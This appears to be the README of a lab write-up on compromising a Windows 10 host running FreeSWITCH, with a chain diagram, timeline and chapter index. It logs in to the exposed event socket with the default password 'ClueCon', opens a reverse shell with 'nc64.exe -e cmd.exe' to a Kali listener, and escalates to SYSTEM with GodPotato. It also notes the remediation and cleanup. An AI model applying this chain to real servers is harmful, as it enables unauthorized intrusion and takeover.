# 192.168.137.151 — `gust` (Windows 10 21H2)

| | |
|---|---|
| **Hostname** | `OSCP` (workgroup, not domain-joined) |
| **OS** | Windows 10, build `10.0.19043.2130` (21H2) |
| **Open ports** | `80` IIS 10.0 · `2855` · `2856` TLS · `3389` RDP · `5060`/`5080` SIP · `5066`, `8081`, `8082` WebSocket · `5986` WinRM/TLS · `7443` TLS · `7680` · **`8021` FreeSWITCH event socket** |
| **Product** | FreeSWITCH `1.10.1~64bit` (mod_sofia, mod_event_socket) |
| **Difficulty** | Easy–Medium — one default password, then one privilege |
| **Result** | `NT AUTHORITY\SYSTEM`, both flags |
| **Flags** | `9d05eefc0447258ceab32e91e3b54aac` (user) · `46586fc8f483adc13d76335768bf0a4c` (root) |

---

## Where commands run

This box never gives a shell first. The initial access is **command execution over the FreeSWITCH
event socket**, so most commands are issued from Kali through a wrapper, and only chapter 03 produces
a real shell.

| Marker | Host | What you are typing into |
|---|---|---|
| **On Kali** | attacker box, `192.168.45.158` (VPN `tun0`) | a normal terminal |
| **On Kali → target** | attacker box | `python3 1.py 192.168.137.151 "<cmd>"` — the command runs on the target through ESL |
| **In the SYSTEM shell** | a `nc` listener on Kali | `cmd.exe` as `NT AUTHORITY\SYSTEM`, obtained in chapter 05 |

Anything referencing `C:\` **must** run on the target; anything serving a file or listening for a
callback runs on Kali.

---

## TL;DR — the chain

```
8021/tcp  FreeSWITCH mod_event_socket (ESL)
  └─ auth ClueCon                        ← built-in default password, unchanged
     └─ api system <cmd>                 ← executes as OSCP\chris (service account)
        ▼
   command execution as chris
     ├─ whoami /all
     │    ├─ BUILTIN\Users only          → no admin group path
     │    ├─ High Mandatory Level        → token is elevated, not filtered
     │    └─ SeImpersonatePrivilege      ← Enabled  ⇒ Potato attack
     ├─ nc64.exe -e cmd.exe              → real shell (chris, service context)
     └─ C:\Users\chris\Desktop\local.txt
        ▼
   GodPotato-NET4  (SeImpersonate → RPCSS → SYSTEM token)
     └─ -cmd "cmd /c copy proof.txt …"   → SYSTEM writes the file
        ▼
   NT AUTHORITY\SYSTEM
     ├─ C:\Users\Administrator\Desktop\proof.txt
     └─ reg query HKLM\SECURITY\…        → readable only as SYSTEM
```

Two configuration decisions, no software vulnerability:

1. **The event socket is exposed with the default password.** `ClueCon` is the shipped value, ESL is
   listening on all interfaces, and `apply-inbound-acl` is commented out. ESL is an administrative
   control interface, so this is remote command execution by design.
2. **The service account holds `SeImpersonatePrivilege` on a high-integrity token.** A PBX has no
   legitimate need for it, and it converts "code execution as chris" into "SYSTEM" with one
   well-known tool.

---

## Chapters

| # | Chapter | What it covers |
|---|---|---|
| 01 | [Reconnaissance](01-reconnaissance.md) | full TCP scan, 13 open ports behind a dropping firewall, FreeSWITCH 1.10.1 identified |
| 02 | [The event socket](02-esl.md) | the raw ESL handshake, `ClueCon`, `api system`, and what `-ERR no reply` really means |
| 03 | [Foothold](03-foothold.md) | command execution as `chris`, egress test, `certutil` staging, first real shell |
| 04 | [Enumeration](04-enumeration.md) | `whoami /all`, `SeImpersonatePrivilege`, the staged toolset, flag ACLs |
| 05 | [Privilege escalation](05-privilege-escalation.md) | GodPotato → SYSTEM, the reading of `proof.txt`, and four failed variants |
| 06 | [Flags](06-flags.md) | both values, with the account that read each one |
| 07 | [Cleanup and lessons](07-cleanup-and-lessons.md) | artefact removal, remediation, and what the box teaches |

---

## Timeline

| Time (Kali) | Action | Result |
|---|---|---|
| — | `auth ClueCon` on 8021 | `+OK accepted` — default credentials |
| — | `api system whoami` | `oscp\chris` |
| — | `pwd`, `cd \scripts` | `-ERR no reply` — stdout-only interface understood |
| — | `whoami /all` | High IL, `BUILTIN\Users`, `SeImpersonatePrivilege` enabled |
| — | `nc64.exe -e cmd.exe` via ESL | shell as `oscp\chris` |
| — | `type …\local.txt` | `9d05eefc0447258ceab32e91e3b54aac` |
| — | `type …\Administrator\Desktop\proof.txt` | `Access is denied` (negative control) |
| — | `GodPotato-NET4.exe -cmd "cmd /c copy …"` | `Find System Token : True`, `1 file(s) copied.` |
| — | `type …\proof_out.txt` as `chris` | `46586fc8f483adc13d76335768bf0a4c` |
| — | `nc64.exe -e cmd.exe` via GodPotato | SYSTEM shell, `reg query HKLM\SECURITY` succeeds |
| 14:38 | `nmap -p-` (retrospective) | 13 open, 65522 filtered |
| 14:39 | `nmap -sV -sC` | FreeSWITCH `1.10.1~64bit`, host `OSCP`, build `19041` |
| 14:43 | raw ESL handshake captured | evidence for chapter 02 |
| 14:44 | `curl http://…/` | stock IIS 10.0 page |
| — | cleanup | staged files deleted, listeners closed |

Times are the ones recorded in the transcripts. The box carries a **+7 hour clock skew** relative to
Kali (nmap `clock-skew: 6h59m58s`), which is visible in file timestamps on the target.

---

## Artefacts in this directory

| Path | Contents |
|---|---|
| `evidence/full_tcp.txt` | raw full-port nmap output — **local only**, `.gitignore` excludes raw scans |
| `evidence/services.txt` | `-sV -sC` fingerprint of all open ports — **local only**, same rule |
| `evidence/http80.txt` | IIS response headers and default page |
| `evidence/esl_handshake.txt` | raw `auth ClueCon` / `api system` exchange |
| `evidence/esl_output_quirks.txt` | the `-ERR no reply` cases and their causes |
| `evidence/whoami_all.txt` | full token, groups and privileges as `chris` |
| `evidence/temp_inventory.txt` | the toolset staged in `chris`'s temp directory |
| `evidence/godpotato_log.txt` | escalation log plus the `proof.txt` read |
| `evidence/root_shell.txt` | SYSTEM shell transcript, both flags |
| `tools/1.py` | the ESL client used for every `python3 1.py` command |
